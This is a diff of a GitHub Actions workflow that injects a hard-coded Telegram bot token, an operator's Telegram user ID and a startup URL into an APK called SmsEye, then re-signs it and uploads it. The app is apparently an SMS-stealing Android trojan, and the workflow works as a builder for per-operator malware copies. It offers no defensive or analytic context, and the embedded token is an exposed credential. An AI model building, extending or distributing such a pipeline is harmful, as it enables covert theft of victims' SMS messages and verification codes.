@@ -1,60 +1,54 @@
-name: Inject assets into APK without rebuilding
+name: Inject Telegram Info into SmsEye APK
 
 on:
   workflow_dispatch:
     inputs:
       user_id:
-        description: 'Telegram numeric user ID (id.txt)'
+        description: 'Telegram numeric user ID (for id.txt)'
         required: true
       app_url:
-        description: 'Startup URL (url.txt)'
+        description: 'Startup URL to inject (url.txt)'
         required: true
 
 jobs:
-  patch-apk:
+  inject-assets:
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout code
+    - name: Checkout repo
       uses: actions/checkout@v3
 
     - name: Install tools
-      run: |
-        sudo apt update
-        sudo apt install -y default-jdk zipalign unzip
+      run: sudo apt install -y zipalign unzip default-jdk
 
-    - name: Unpack APK
+    - name: Extract signed APK
       run: |
         mkdir working
-        cp SmsEye2.apk original.apk
-        unzip -q original.apk -d working
+        unzip -q SmsEye2_signed.apk -d working
 
-    - name: Inject files into assets/
+    - name: Inject asset values
       run: |
         echo "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4" > working/assets/token.txt
         echo "${{ github.event.inputs.user_id }}" > working/assets/id.txt
         echo "${{ github.event.inputs.app_url }}" > working/assets/url.txt
 
-    - name: Rebuild APK
+    - name: Repack APK
       run: |
         cd working
-        zip -r ../unsigned.apk *
+        zip -qr ../unsigned.apk *
         cd ..
 
-    - name: Align and Sign APK
+    - name: Sign the APK
       run: |
         zipalign -v 4 unsigned.apk aligned.apk
-
         keytool -genkey -v -keystore keystore.jks -storepass password -alias key0 -keypass password \
-          -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=SmsEye"
-
+          -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=SmsEyeAuto"
         jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \
           -keystore keystore.jks -storepass password -keypass password aligned.apk key0
-
         mv aligned.apk SmsEye_Modified.apk
 
-    - name: Upload APK
+    - name: Upload final APK
       uses: actions/upload-artifact@v4
       with:
-        name: Final-Patched-APK
+        name: SmsEye-Patched-${{ github.event.inputs.user_id }}
         path: SmsEye_Modified.apk
